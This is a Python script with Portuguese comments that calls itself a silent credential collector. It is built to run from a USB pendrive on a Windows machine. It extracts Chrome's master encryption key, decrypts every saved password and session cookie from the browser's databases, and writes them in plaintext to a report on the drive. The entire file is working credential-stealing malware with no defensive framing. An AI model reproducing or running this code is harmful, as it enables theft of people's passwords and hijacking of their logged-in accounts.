import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# ============================================================
# 1. CONFIGURAÇÕES INICIAIS – CRIA A PASTA IMEDIATAMENTE
# ============================================================

# Pasta onde o .exe está rodando (geralmente o pendrive)
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))

# Pasta de saída dos dados
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")

# TENTA CRIAR A PASTA NO PENDRIVE
try:
    os.makedirs(PASTA_SAIDA, exist_ok=True)
    print("[OK] Pasta 'Credenciais' criada no pendrive.")
except Exception as e:
    # SE FALHAR, CRIA NA ÁREA DE TRABALHO (FALLBACK)
    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:/Users'), 'Desktop')
    PASTA_SAIDA = os.path.join(desktop, "Credenciais_Backup")
    os.makedirs(PASTA_SAIDA, exist_ok=True)
    print(f"[AVISO] Pasta criada na área de trabalho: {PASTA_SAIDA}")

# Arquivo de LOG (dentro da pasta)
LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    """Grava mensagens no arquivo de log."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(str(texto) + "\n")
    print(texto)

# ============================================================
# 2. FUNÇÃO PARA OBTER A CHAVE DE CRIPTOGRAFIA DO CHROME
# ============================================================

def obter_chave_mestra():
    """Extrai a chave mestra do Chrome (usada para descriptografar senhas e cookies)."""
    usuario = os.getlogin()
    caminho_chave = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Local State"

    if not os.path.exists(caminho_chave):
        raise FileNotFoundError(f"Chrome não encontrado: {caminho_chave}")

    with open(caminho_chave, "r", encoding="utf-8") as f:
        dados = json.load(f)

    chave_criptografada = base64.b64decode(dados["os_crypt"]["encrypted_key"])[5:]
    chave = win32crypt.CryptUnprotectData(chave_criptografada, None, None, None, 0)[1]
    return chave

# ============================================================
# 3. FUNÇÕES DE COLETA DE DADOS
# ============================================================

def coletar_senhas(chave):
    """Coleta todas as senhas salvas no Chrome."""
    log("  [1/2] Coletando senhas...")
    usuario = os.getlogin()
    caminho_db = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Login Data"

    if not os.path.exists(caminho_db):
        log("    AVISO: Chrome não possui dados de login.")
        return ["Nenhuma senha encontrada."]

    # Copia o banco de dados para evitar bloqueio
    temp_db = os.path.join(PASTA_SAIDA, "temp_senhas.db")
    shutil.copyfile(caminho_db, temp_db)

    credenciais = []
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for url, usuario, senha_criptografada in cursor.fetchall():
        try:
            nonce = senha_criptografada[3:15]
            ciphertext = senha_criptografada[15:-16]
            tag = senha_criptografada[-16:]

            cipher = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")

            credenciais.append(f"URL: {url}\nUsuário: {usuario}\nSenha: {senha}\n")
        except Exception as e:
            log(f"    Erro ao descriptografar: {e}")

    conn.close()
    os.remove(temp_db)
    log(f"    OK: {len(credenciais)} senhas encontradas.")
    return credenciais

def coletar_cookies(chave):
    """Coleta os cookies (sessões ativas) do Chrome."""
    log("  [2/2] Coletando cookies...")
    usuario = os.getlogin()
    caminho_db = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"

    if not os.path.exists(caminho_db):
        log("    AVISO: Nenhum cookie encontrado.")
        return ["Nenhum cookie encontrado."]

    temp_db = os.path.join(PASTA_SAIDA, "temp_cookies.db")
    shutil.copyfile(caminho_db, temp_db)

    cookies = []
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

    for host, nome, valor_criptografado in cursor.fetchall():
        try:
            nonce = valor_criptografado[3:15]
            ciphertext = valor_criptografado[15:-16]
            tag = valor_criptografado[-16:]

            cipher = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")

            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass  # Ignora cookies que não podem ser descriptografados

    conn.close()
    os.remove(temp_db)
    log(f"    OK: {len(cookies)} cookies encontrados.")
    return cookies

# ============================================================
# 4. FUNÇÃO PRINCIPAL
# ============================================================

def main():
    log("=" * 60)
    log("COLETOR DE CREDENCIAIS - MODO SILENCIOSO")
    log(f"Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuário: {os.getlogin()}")
    log(f"Pasta de saída: {PASTA_SAIDA}")
    log("=" * 60)

    try:
        # Obtém a chave mestra do Chrome
        chave = obter_chave_mestra()
        log("\n[OK] Chave de criptografia obtida com sucesso.")
    except Exception as e:
        log(f"\n[ERRO] Falha ao obter chave do Chrome: {e}")
        # Cria um arquivo de erro para diagnóstico
        with open(os.path.join(PASTA_SAIDA, "erro_chave.txt"), "w") as f:
            f.write(str(e))
        return

    # Coleta os dados
    log("\n[+] Coletando dados...")
    dados = {
        "Senhas": coletar_senhas(chave),
        "Cookies": coletar_cookies(chave)
    }

    # Gera o nome do arquivo com data/hora
    nome_arquivo = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    caminho_relatorio = os.path.join(PASTA_SAIDA, nome_arquivo)

    # Escreve o relatório
    with open(caminho_relatorio, "w", encoding="utf-8") as f:
        f.write("=" * 80 + "\n")
        f.write("RELATÓRIO COMPLETO DE CREDENCIAIS\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Usuário: {os.getlogin()}\n")
        f.write("=" * 80 + "\n\n")

        for secao, itens in dados.items():
            f.write(f"[{secao.upper()}]\n")
            f.write("-" * 40 + "\n")
            if itens:
                for item in itens:
                    f.write(item + "\n")
            else:
                f.write("Nenhum dado encontrado.\n")
            f.write("\n")

    # Cria uma cópia do relatório na RAIZ do pendrive
    try:
        shutil.copy(caminho_relatorio, os.path.join(PASTA_ATUAL, nome_arquivo))
        log(f"\n[OK] Relatório salvo em: {caminho_relatorio}")
        log(f"[OK] Cópia na raiz do pendrive: {nome_arquivo}")
    except Exception as e:
        log(f"[AVISO] Não foi possível copiar para a raiz: {e}")

    log("\n" + "=" * 60)
    log("EXECUÇÃO FINALIZADA COM SUCESSO!")
    log("=" * 60)

    # Pequena pausa antes de fechar (opcional)
    time.sleep(2)

# ============================================================
# 5. PONTO DE ENTRADA
# ============================================================

if __name__ == "__main__":
    main()
